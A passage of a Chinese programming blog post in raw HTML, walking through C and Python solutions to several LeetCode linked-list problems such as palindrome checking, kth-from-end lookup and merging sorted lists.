class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(struct ListNode* head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">sptr</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sptr</span> *<span class="title">last</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">ptrn</span>;</span></span><br><span class="line">    &#125;sPtr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">ptr</span>=<span class="title">head</span>;</span></span><br><span class="line">    sPtr *temp,*temp2=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(ptr!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp=(sPtr*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(sPtr));</span><br><span class="line">        temp-&gt;last=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span>(temp2!=<span class="literal">NULL</span>)</span><br><span class="line">            temp-&gt;last=temp2;</span><br><span class="line">        temp-&gt;ptrn=ptr;</span><br><span class="line">        ptr=ptr-&gt;next;</span><br><span class="line">        i++;</span><br><span class="line">        <span class="keyword">if</span>(ptr!=<span class="literal">NULL</span>)</span><br><span class="line">            temp2=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;i/<span class="number">2</span>;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(head-&gt;val!=temp-&gt;ptrn-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        head=head-&gt;next;</span><br><span class="line">        temp=temp-&gt;last;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>很显然，最终的结果惨不忍睹</del><br><img src="https://img-blog.csdnimg.cn/20191105010716426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FydHRuYmEz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="进阶解法：快慢指针-amp-链表反转"><a href="#进阶解法：快慢指针-amp-链表反转" class="headerlink" title="进阶解法：快慢指针&amp;链表反转"></a>进阶解法：快慢指针&amp;链表反转</h3><h4 id="概念：快慢指针"><a href="#概念：快慢指针" class="headerlink" title="概念：快慢指针"></a>概念：快慢指针</h4><p>快慢指针为链表题里用的挺多的一个小技巧</p><p>当我们在遍历一个链表的时候，我们可以使用两个指针进行遍历，一个步长为1（为慢指针），一个步长为2（为快指针），这样当快指针走到链表尾的时候，慢指针刚好走到链表的中段</p><p>简单的代码实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">sptr</span>, *<span class="title">fptr</span>;</span><span class="comment">//slow pointer and fast pointer</span></span><br><span class="line"><span class="keyword">int</span> l_list;</span><br><span class="line"><span class="keyword">for</span>(l_list=<span class="number">0</span>;sptr!=<span class="literal">NULL</span>;l_list++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(l_list%<span class="number">2</span>)</span><br><span class="line">sptr=sptr-&gt;next;</span><br><span class="line">fptr=fptr-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们在判断一个链表是否为回文链表的时候，我们可以选择使用快慢指针对链表进行一次遍历，<strong>再将前半部分链表进行反转</strong>，之后从头指针开始配合使用慢指针同步对比前后半部分是否相同</p><p>反转链表的实现方法在前文已经讲过了，不再做过多解析</p><p>最终的代码实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="literal">NULL</span>||head-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(head-&gt;next-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(head-&gt;val==head-&gt;next-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">fptr</span>, *<span class="title">sptr</span>, *<span class="title">temp</span>, *<span class="title">temp2</span>, *<span class="title">ptr1</span>, *<span class="title">ptr2</span>;</span></span><br><span class="line">    <span class="keyword">int</span> l_list,i;</span><br><span class="line">    fptr=sptr=head;</span><br><span class="line">    <span class="keyword">for</span>(l_list=<span class="number">0</span>;fptr!=<span class="literal">NULL</span>;l_list++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(l_list%<span class="number">2</span>)</span><br><span class="line">            sptr=sptr-&gt;next;</span><br><span class="line">        fptr=fptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    ptr1=head;</span><br><span class="line">    ptr2=head-&gt;next;</span><br><span class="line">    ptr1-&gt;next=sptr;</span><br><span class="line">    <span class="keyword">while</span>(ptr2!=sptr)</span><br><span class="line">    &#123;</span><br><span class="line">        temp2=ptr2-&gt;next;</span><br><span class="line">        ptr2-&gt;next=ptr1;</span><br><span class="line">        ptr1=ptr2;</span><br><span class="line">        ptr2=temp2;</span><br><span class="line">    &#125;</span><br><span class="line">    head=ptr1;</span><br><span class="line">    <span class="keyword">if</span>(l_list%<span class="number">2</span>)</span><br><span class="line">        sptr=sptr-&gt;next;</span><br><span class="line">    l_list/=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;l_list;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(head-&gt;val!=sptr-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        head=head-&gt;next;</span><br><span class="line">        sptr=sptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191106195549632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FydHRuYmEz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x03-面试题-02-02-返回倒数第-k-个节点"><a href="#0x03-面试题-02-02-返回倒数第-k-个节点" class="headerlink" title="0x03.面试题 02.02. 返回倒数第 k 个节点"></a>0x03.<a href="https://leetcode-cn.com/problems/kth-node-from-end-of-list-lcci/" target="_blank" rel="noopener">面试题 02.02. 返回倒数第 k 个节点</a></h2><blockquote><p>实现一种算法，找出单向链表中倒数第 k 个节点。返回该节点的值。</p><p>注意：本题相对原题稍作改动</p><p>示例：</p><p>输入： 1-&gt;2-&gt;3-&gt;4-&gt;5 和 k = 2<br>输出： 4<br>说明：</p><p>给定的 k 保证是有效的。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/kth-node-from-end-of-list-lcci" target="_blank" rel="noopener">https://leetcode-cn.com/problems/kth-node-from-end-of-list-lcci</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>首先题目保证了<strong>给定的k是有效的</strong>，那么我们就不需要考虑各种可能出现的奇葩边界情况了，一切数据都是理想数据<del>，真好啊，现实中咋没有这么好的用户呢</del></p><p>那么我们的算法很容易就出来了</p><h3 id="解法：双指针"><a href="#解法：双指针" class="headerlink" title="解法：双指针"></a>解法：双指针</h3><p>因为<strong>当遍历到倒数第k个链表时，该结点的下k个结点必定是NULL</strong>，故我们选择使用两个指针来对链表进行同步遍历，<strong>第二个指针初始设置为头结点的下k个结点，当第二个指针为NULL时直接返回头结点即可</strong></p><p>线性时间复杂度为<strong>O</strong>(<strong>N</strong>)，因为只需要一个额外的指针的空间故空间复杂度为常数空间复杂度<strong>O</strong>(<strong>1</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kthToLast</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span> = <span class="title">head</span>;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(temp == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> head-&gt;val;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/21/pARI2NX5TKS7OxH.png" alt="image.png"></p><h2 id="0x04-剑指-Offer-22-链表中倒数第k个节点"><a href="#0x04-剑指-Offer-22-链表中倒数第k个节点" class="headerlink" title="0x04.剑指 Offer 22. 链表中倒数第k个节点"></a>0x04.<a href="https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/" target="_blank" rel="noopener">剑指 Offer 22. 链表中倒数第k个节点</a></h2><blockquote><p>输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。例如，一个链表有6个节点，从头节点开始，它们的值依次是1、2、3、4、5、6。这个链表的倒数第3个节点是值为4的节点。</p><p>示例：</p><p>给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 k = 2.</p><p>返回链表 4-&gt;5.</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof" target="_blank" rel="noopener">https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>和0x03基本上思路是一样的，直接<strong>双指针</strong>一套带走</p><h3 id="解法：双指针-1"><a href="#解法：双指针-1" class="headerlink" title="解法：双指针"></a>解法：双指针</h3><p>因为<strong>当遍历到倒数第k个链表时，该结点的下k个结点必定是NULL</strong>，故我们选择使用两个指针来对链表进行同步遍历，<strong>第二个指针初始设置为头结点的下k个结点，当第二个指针为NULL时直接返回头结点即可</strong></p><p>线性时间复杂度为<strong>O</strong>(<strong>N</strong>)，因为只需要一个额外的指针的空间故空间复杂度为常数空间复杂度<strong>O</strong>(<strong>1</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">getKthFromEnd</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span> = <span class="title">head</span>;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(temp == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/21/lh3pIbj54Atn1kX.png" alt="image.png"></p><h2 id="0x05-面试题-02-03-删除中间节点"><a href="#0x05-面试题-02-03-删除中间节点" class="headerlink" title="0x05.面试题 02.03. 删除中间节点"></a>0x05.<a href="https://leetcode-cn.com/problems/delete-middle-node-lcci/" target="_blank" rel="noopener">面试题 02.03. 删除中间节点</a></h2><blockquote><p>实现一种算法，删除单向链表中间的某个节点（即不是第一个或最后一个节点），假定你只能访问该节点。</p><p>示例：</p><p>输入：单向链表a-&gt;b-&gt;c-&gt;d-&gt;e-&gt;f中的节点c<br>结果：不返回任何数据，但该链表变为a-&gt;b-&gt;d-&gt;e-&gt;f</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/delete-middle-node-lcci" target="_blank" rel="noopener">https://leetcode-cn.com/problems/delete-middle-node-lcci</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>这道题和<strong>【简单】0x00</strong>是一样的，基本算法是把<strong>自身变成自身的下一个结点</strong>，这里就不再多讲了</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(struct ListNode* node)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node-&gt;val = node-&gt;next-&gt;val;</span><br><span class="line">    node-&gt;next = node-&gt;next-&gt;next;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/21/nA3lmwv7kyefxuJ.png" alt="image.png"></p><h2 id="0x06-合并两个有序链表"><a href="#0x06-合并两个有序链表" class="headerlink" title="0x06.合并两个有序链表"></a>0x06.<a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/" target="_blank" rel="noopener">合并两个有序链表</a></h2><blockquote><p>将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p><p>示例：</p><p>输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4<br>输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/merge-two-sorted-lists" target="_blank" rel="noopener">https://leetcode-cn.com/problems/merge-two-sorted-lists</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>遍历l1和l2的每一个结点、比较大小并进行重构即可</p><p>这里我选择使用额外的两个指针，一个保存头结点，一个作为重构过程中的尾结点</p><p>需要注意的是<strong>l1和l2有可能为NULL</strong>以及<strong>不要忘了把l1或l2的剩余部分进行拼接</strong></p><h3 id="C语言版："><a href="#C语言版：" class="headerlink" title="C语言版："></a>C语言版：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">mergeTwoLists</span><span class="params">(struct ListNode* l1, struct ListNode* l2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!l1)</span><br><span class="line">        <span class="keyword">return</span> l2;</span><br><span class="line">    <span class="keyword">if</span>(!l2)</span><br><span class="line">        <span class="keyword">return</span> l1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">head</span>, *<span class="title">temp</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(l1-&gt;val&gt;l2-&gt;val)</span><br><span class="line">    &#123;</span><br><span class="line">        head = l2;</span><br><span class="line">        l2 = l2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        head = l1;</span><br><span class="line">        l1 = l1-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    temp = head;</span><br><span class="line">    <span class="keyword">while</span>(l1&amp;&amp;l2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(l1-&gt;val&gt;l2-&gt;val)</span><br><span class="line">        &#123;</span><br><span class="line">            temp-&gt;next = l2;</span><br><span class="line">            temp = l2;</span><br><span class="line">            l2 = l2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            temp-&gt;next = l1;</span><br><span class="line">            temp = l1;</span><br><span class="line">            l1 = l1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(l1)</span><br><span class="line">        temp-&gt;next = l1;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        temp-&gt;next = l2;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>活用三目运算符的奇怪写法（指专门写的让人看不懂（雾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">mergeTwoLists</span><span class="params">(struct ListNode* l1, struct ListNode* l2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!l1)</span><br><span class="line">        <span class="keyword">return</span> l2;</span><br><span class="line">    <span class="keyword">if</span>(!l2)</span><br><span class="line">        <span class="keyword">return</span> l1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">head</span>, *<span class="title">temp</span>, *<span class="title">temp2</span>;</span></span><br><span class="line">    head = l1-&gt;val &lt; l2-&gt;val ? (temp = l1, l1 = l1-&gt;next, temp) : (temp = l2, l2 = l2-&gt;next, temp);</span><br><span class="line">    temp = head;</span><br><span class="line">    <span class="keyword">while</span>(l1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!l2)</span><br><span class="line">        &#123;</span><br><span class="line">            temp-&gt;next = l1;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        temp = temp-&gt;next = l1-&gt;val &lt; l2-&gt;val ? (temp2 = l1, l1 = l1-&gt;next, temp2) : (temp2 = l2, l2 = l2-&gt;next, temp2);</span><br><span class="line">    &#125;</span><br><span class="line">    temp-&gt;next = l2;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wX28Sg.png" alt="wX28Sg.png"></p><h3 id="Python语言版："><a href="#Python语言版：" class="headerlink" title="Python语言版："></a>Python语言版：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, next=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.next = next</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTwoLists</span><span class="params">(self, l1: ListNode, l2: ListNode)</span> -&gt; ListNode:</span></span><br><span class="line">        <span class="keyword">if</span> l1 == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> l2</span><br><span class="line">        <span class="keyword">if</span> l2 == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> l1</span><br><span class="line">        head = l1 <span class="keyword">if</span> l1.val &lt; l2.val <span class="keyword">else</span> l2</span><br><span class="line">        <span class="keyword">if</span> head == l1:</span><br><span class="line">            l1 = l1.next</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l2 = l2.next</span><br><span class="line">        temp = head</span><br><span class="line">        <span class="keyword">while</span> l1 != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> l2 == <span class="literal">None</span>:</span><br><span class="line">                temp.next = l1</span><br><span class="line">                <span class="keyword">return</span> head</span><br><span class="line">            temp.next = l1 <span class="keyword">if</span> l1.val &lt; l2.val <span class="keyword">else</span> l2</span><br><span class="line">            temp = temp.next</span><br><span class="line">            <span class="keyword">if</span> temp == l1:</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l2 = l2.next</span><br><span class="line">        temp.next = l2</span><br><span class="line">        <span class="keyword">return</span> head</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wX2iFK.png" alt="wX2iFK.png"></p><h2 id="0x07-剑指-Offer-18-删除链表的节点"><a href="#0x07-剑指-Offer-18-删除链表的节点" class="headerlink" title="0x07.剑指 Offer 18. 删除链表的节点"></a>0x07.<a href="https://leetcode-cn.com/problems/shan-chu-lian-biao-de-jie-dian-lcof/" target="_blank" rel="noopener">剑指 Offer 18. 删除链表的节点</a></h2><blockquote><p>给定单向链表的头指针和一个要删除的节点的值，定义一个函数删除该节点。</p><p>返回删除后的链表的头节点。</p><p>注意：此题对比原题有改动</p><p>示例 1:</p><p>输入: head = [4,5,1,9], val = 5<br>输出: [4,1,9]<br>解释: 给定你链表中值为 5 的第二个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 1 -&gt; 9.<br>示例 2:</p><p>输入: head = [4,5,1,9], val = 1<br>输出: [4,5,9]<br>解释: 给定你链表中值为 1 的第三个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 5 -&gt; 9.</p><p>说明：</p><p>题目保证链表中节点的值互不相同<br>若使用 C 或 C++ 语言，你不需要 free 或 delete 被删除的节点</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/shan-chu-lian-biao-de-jie-dian-lcof" target="_blank" 